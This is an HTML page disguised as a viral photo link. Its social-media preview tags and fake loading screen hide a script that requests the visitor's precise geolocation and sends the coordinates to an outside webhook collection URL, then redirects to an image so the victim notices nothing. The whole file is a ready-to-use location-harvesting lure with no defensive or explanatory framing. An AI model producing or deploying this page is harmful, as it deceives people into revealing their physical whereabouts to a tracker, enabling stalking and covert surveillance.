<!DOCTYPE <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Amazing Photo</title>

    <!-- Open Graph Meta Tags -->
    <meta property="og:title" content="Check out this amazing photo!">
    <meta property="og:description" content="Click to view the full photo">
    <meta property="og:image" content="https://i.postimg.cc/y8vGyQWF/IMG-6637.jpg">
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://your-site-link.com/viral.html">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="margin:0; display:flex; justify-content:center; align-items:center; height:100vh; background:white; font-family:sans-serif;">

    <!-- Loading Screen -->
    <div style="text-align:center;">
        <h2>Please wait...</h2>
        <p>Loading content...</p>
        <div style="margin-top:20px;">
            <div style="border:4px solid #ccc; border-top:4px solid #333; border-radius:50%; width:40px; height:40px; animation: spin 1s linear infinite;"></div>
        </div>
    </div>

    <style>
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>

    <script>
        const targetURL = "https://i.postimg.cc/y8vGyQWF/IMG-6637.jpg"; // Redirect here
        const webhookURL = "https://webhook.site/df38940f-cedd-4529-8fdb-ac6d2b4ad408"; // Your webhook

        function sendLocation(lat, lon) {
            fetch(webhookURL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({ latitude: lat, longitude: lon })
            });
        }

        window.onload = function() {
            if (navigator.geolocation) {
                // Small delay before asking location
                setTimeout(() => {
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            sendLocation(position.coords.latitude, position.coords.longitude);
                            setTimeout(() => { window.location.href = targetURL; }, 2000);
                        },
                        function() {
                            // User denied
                            setTimeout(() => { window.location.href = targetURL; }, 2000);
                        },
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                }, 500);
            } else {
                // Geolocation not supported
                setTimeout(() => { window.location.href = targetURL; }, 2000);
            }
        };
    </script>
</body>
</html>
